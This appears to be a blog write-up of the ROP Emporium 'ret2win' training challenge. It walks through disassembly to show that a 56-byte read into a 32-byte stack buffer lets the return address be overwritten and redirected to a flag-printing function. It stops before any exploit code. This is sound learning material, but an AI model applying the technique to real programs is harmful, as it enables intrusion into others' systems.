posts/2021-03-22-ropemporium-ret2win.org
*** Main function
#+caption: main function disassembled 
#+begin_src asm
  push    rbp {__saved_rbp}
  mov     rbp, rsp {__saved_rbp}
  mov     rax, qword [rel stdout]
  mov     ecx, 0x0
  mov     edx, 0x2
  mov     esi, 0x0
  mov     rdi, rax
  call    setvbuf
  mov     edi, 0x400808  {"ret2win by ROP Emporium"}
  call    puts
  mov     edi, 0x400820  {"x86_64\n"}
  call    puts
  mov     eax, 0x0
  call    pwnme
  mov     edi, 0x400828  {"\nExiting"}
  call    puts
  mov     eax, 0x0
  pop     rbp {__saved_rbp}
  retn     {__return_addr}
#+end_src
Here we see the main function disassembled, there isn't anything interesting to see.
What we want is the function pwnme, which is called on line 14.
So let's take a look at that instead shall we?
*** pwnme function
#+caption: pwnme function disassembled
#+begin_src asm
  push    rbp {__saved_rbp}
  mov     rbp, rsp {__saved_rbp}
  sub     rsp, 0x20
  lea     rax, [rbp-0x20 {var_28}]
  mov     edx, 0x20
  mov     esi, 0x0
  mov     rdi, rax {var_28}
  call    memset
  mov     edi, 0x400838  {"For my first trick, I will attem…"}
  call    puts
  mov     edi, 0x400898  {"What could possibly go wrong?"}
  call    puts
  mov     edi, 0x4008b8  {"You there, may I have your input…"}
  call    puts
  mov     edi, 0x400918
  mov     eax, 0x0
  call    printf
  lea     rax, [rbp-0x20 {var_28}]
  mov     edx, 0x38
  mov     rsi, rax {var_28}
  mov     edi, 0x0
  call    read
  mov     edi, 0x40091b  {"Thank you!"}
  call    puts
  nop     
  leave    {__saved_rbp}
  retn     {__return_addr}
#+end_src

Since this is the function, which should be pwned, lets take a closer look using binary ninjas HLIL.
I know I shouldn't rely on it, but I'm still learning so yeah.
#+caption: pwnme function HLIL
#+begin_src c
  void var_28
  memset(&var_28, 0, 0x20)
  puts(str: "For my first trick, I will attem…")
  puts(str: "What could possibly go wrong?")
  puts(str: "You there, may I have your input…")
  printf(format: data_400918)
  read(fd: 0, buf: &var_28, nbytes: 0x38)
  return puts(str: "Thank you!")
#+end_src

Let's clean it up a bit for easier understanding:
#+caption: pwnme function HLIL with var names
#+begin_src c
  void buffer
  memset(&buffer, 0, 32)
  puts(str: "For my first trick, I will attem…")
  puts(str: "What could possibly go wrong?")
  puts(str: "You there, may I have your input…")
  printf(format: data_400918)
  read(fd: 0, buf: &buffer, nbytes: 56)
  return puts(str: "Thank you!")
#+end_src

As we can see we have a buffer with the size 32 bytes, but the read call accepts up to 56 bytes.
This means that we can overflow the buffer and control the stack.
But how should we control the stack?

Well if you look at the last two lines of the disassembly version of ~pwnme~
#+begin_src asm
  leave    {__saved_rbp}
  retn     {__return_addr}
#+end_src
If we somehow managed to overwrite ~__return_addr~ we potentially have the ability to make arbitrary code calls.

*** ret2win function
#+caption: ret2win function disassembled
#+begin_src asm
  push    rbp {__saved_rbp}
  mov     rbp, rsp {__saved_rbp}
  mov     edi, 0x400926  {"Well done! Here's your flag:"}
  call    puts
  mov     edi, 0x400943  {"/bin/cat flag.txt"}
  call    system
  nop     
  pop     rbp {__saved_rbp}
  retn     {__return_addr}
#+end_src
This is the function we must aim the ~ret~ instruction towards in the ~pwnme~ function

And as we can see it just executes ~/bin/cat flag.txt~ on the system.

* Exploit
When writing the actual exploit I used 3 tools: ~emacs~, a ~terminal~ and ~gdb~.
The first one being my text editor ;), the second is pretty self explanatory and the last is Gnu Debugger.

